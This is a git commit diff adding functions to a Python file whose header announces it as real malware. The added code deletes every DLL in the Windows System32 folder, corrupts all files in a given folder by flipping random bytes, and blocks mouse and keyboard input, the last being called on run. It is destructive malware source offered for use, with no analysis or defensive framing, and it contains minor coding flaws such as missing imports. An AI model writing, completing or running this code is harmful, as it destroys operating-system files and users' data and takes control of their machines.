72c3a70a78d634d85cbd3d573f1bc8c396d76b95
Cooper <Cooperransom08@gmail.com>
2023-03-21 14:46:46 -0400

    added some functions

--- scrypt/main.py
+++ scrypt/main.py
@@ -1,1 +1,70 @@
 # This is malware no joke real malware
+# https://codepal.ai
+
+def delete_dll():
+    """
+    This function deletes all files ending with '.dll' in the 'C:/Windows/system32' directory. 
+    """
+    try:
+        os.chdir('C:/Windows/System32')
+        files = [f for f in os.listdir() if f.endswith('.dll')]
+        for f in files:
+            os.remove(f)
+    except OSError:
+        raise OSError(f'System32 directory does not exist.')
+
+def corrupt_startup_files(source_folder):
+    """This function corrupts startup files in given source folder
+
+    Parameters
+    ----------
+    source_folder : str
+        The path to the source folder where the files should be corrupted
+
+    Returns
+    -------
+    None
+        This function does not return anything.
+    """
+    # Import relevant modules
+    import os, shutil
+ 
+    # Create a list of files in the source directory
+    files_in_source_folder = os.listdir(source_folder)
+ 
+    # Corrupt the files by swapping random bits in their content
+    for file in files_in_source_folder:
+        path_to_file = os.path.join(source_folder, file)
+        with open(path_to_file, "rb") as binary_file:
+            # Read the file
+            data = binary_file.read()
+            # Iterate over the bits in the file content
+            for bit_index in range(len(data)):
+                # Randomly decide whether to switch the bit
+                switch = random.choice([True, False])
+                if switch:
+                    # Replace the bit at the current index with its inverse
+                    data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF]) + data[bit_index + 1:]
+        # Write the corrupted content back to the file
+        with open(path_to_file, "wb") as binary_file:
+            binary_file.write(data)
+
+def disable_mouse_and_keyboard():
+    '''
+    This function disables the mouse and keyboard. 
+    It requires GUI to be available for the script to run.
+    '''
+
+    import uiautomation as auto
+    import time
+
+    try:
+        auto.Win32API.BlockInput(True)
+        print("Mouse and keyboard blocked")
+        time.sleep(15)
+        auto.Win32API.BlockInput(False)
+        print("Mouse and keyboard unblocked")
+    except Exception as e:
+        print(f"Failed because of: {e}")
+ 
+disable_mouse_and_keyboard()
